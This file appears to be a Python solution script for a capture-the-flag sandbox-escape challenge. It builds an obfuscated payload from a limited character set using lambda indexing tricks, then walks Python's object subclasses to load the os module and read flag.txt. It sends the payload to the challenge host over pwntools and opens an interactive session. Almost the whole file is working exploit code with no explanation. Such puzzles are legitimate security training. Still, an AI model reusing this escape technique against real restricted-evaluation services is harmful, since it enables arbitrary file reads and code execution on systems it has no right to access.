from pwn import remote
dirself = ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'run_code', 'title']
title = r"                    (now with refactored code! \o/)"
allowed =  '''abdefgilmrstv"'()*+,.:_ \t\n1204'''

# from string import printable

def b12(x):
    al = 'abdefgilmrtv'
    if x < 12:
        return al[x]
    else:
        return al[x//12-1] + al[x%12]

def genstring(msg):
    retstring = ''
    for c in msg:
        if c in allowed:
            retstring += (f"'{c}'+")
        
        elif c in title:
            index = title.find(c)
            lam = '(lambda %s,s,*ss:s)(*self.title)+'
            offset = [b12(i) for i in range(index)]
            retstring += (lam % ','.join(offset))
        
        elif c in ''.join(dirself):
            for iix,d in enumerate(dirself):
                if c in d:
                    # select inside 
                    
                    lam_internals = '(lambda %s,s,*ss:s)(*dir(self))'
                    offset = [b12(i) for i in range(iix)]
                    lam_internals = lam_internals % ','.join(offset)
                    # outside
                    index = d.find(c)
                    lam = '(lambda %s,s,*ss:s)(*%s)+'
                    offset = [b12(i) for i in range(index)]
                    retstring += (lam % (','.join(offset), lam_internals))
                    break
                    
        else:
            print('Mussolini')
            raise ValueError(f'Mussolini! {c}')
    return retstring[:-1]
    

msg = """().__class__.__mro__.__getitem__("b".__ge__("a")).__subclasses__().__getitem__("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".__len__()).load_module("o"+"s").write("a".__len__(),().__class__.__mro__.__getitem__("b".__ge__("a")).__subclasses__().__getitem__("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".__len__()).load_module("o"+"s").read(().__class__.__mro__.__getitem__("b".__ge__("a")).__subclasses__().__getitem__("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".__len__()).load_module("o"+"s").open("flag.txt","".__len__()),"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".__len__()))"""
msg = genstring(msg)
msg = msg.replace("a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a","a"*121)

print(msg)
print(len(msg))
#ncat --ssl stressful-reader-4.challs.snakectf.org 1337
r = remote('stressful-reader-4.challs.snakectf.org', 1337, ssl=True)
r.sendline(b'25aa103a695888d1f544f1d7829721be')


r.sendline(msg)
r.interactive()